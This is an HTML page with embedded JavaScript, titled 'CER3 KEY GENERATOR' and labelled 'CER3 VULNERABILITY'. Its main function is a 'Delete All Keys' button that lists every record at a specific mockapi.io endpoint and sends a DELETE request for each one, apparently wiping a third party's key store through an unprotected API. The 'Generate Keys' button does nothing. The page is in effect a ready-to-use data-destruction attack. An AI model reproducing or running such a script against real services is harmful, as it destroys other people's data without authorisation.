<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CER3 KEY GENERATOR</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: black;
            border: 2px solid white;
            padding: 20px;
            text-align: center;
            width: 300px;
        }

        h1 {
            font-size: 24px;
            color: white;
            margin-bottom: 20px;
        }

        button {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: none;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
        }

        #deleteBtn {
            background-color: red;
            color: white;
        }

        #generateBtn {
            background-color: green;
            color: white;
        }

        #output {
            margin-top: 20px;
            font-size: 16px;
            color: white;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>CER3 VULNERABILITY</h1>
        <button id="deleteBtn" onclick="deleteKeys()">Delete All Keys</button>
        <button id="generateBtn">Generate Keys</button>
        <div id="output"></div>
    </div>

    <script>
        async function deleteKeys() {
            const url = "https://673ce3d54db5a341d8334ff8.mockapi.io/keys";
            const outputDiv = document.getElementById("output");
            outputDiv.innerHTML = "";  // Clear any previous output

            try {
                // Get the list of items
                const response = await fetch(url);
                if (!response.ok) {
                    outputDiv.innerHTML = `Failed to retrieve items. Status code: ${response.status}`;
                    return;
                }
                const data = await response.json();

                // Iterate over the items and delete each one
                for (const item of data) {
                    if (item.key) {  // Check if 'key' field exists
                        const itemId = item.id;
                        const deleteResponse = await fetch(`${url}/${itemId}`, {
                            method: 'DELETE',
                        });

                        if (deleteResponse.ok) {
                            outputDiv.innerHTML += `Successfully deleted item with ID: ${itemId}<br>`;
                        } else {
                            outputDiv.innerHTML += `Failed to delete item with ID: ${itemId}. Status code: ${deleteResponse.status}<br>`;
                        }
                    } else {
                        outputDiv.innerHTML += `No 'key' field found in item with ID: ${item.id}<br>`;
                    }
                }
            } catch (error) {
                outputDiv.innerHTML = `Error: ${error.message}`;
            }
        }
    </script>
</body>
</html>
